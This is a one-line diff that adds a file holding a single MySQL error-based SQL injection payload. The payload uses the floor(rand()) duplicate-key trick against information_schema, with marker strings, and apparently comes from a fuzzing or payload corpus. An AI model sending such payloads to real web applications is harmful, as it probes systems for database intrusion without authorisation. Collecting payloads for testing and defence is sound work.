@@ -1,0 +1,1 @@
+1")) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (("dtfg"="dtfg
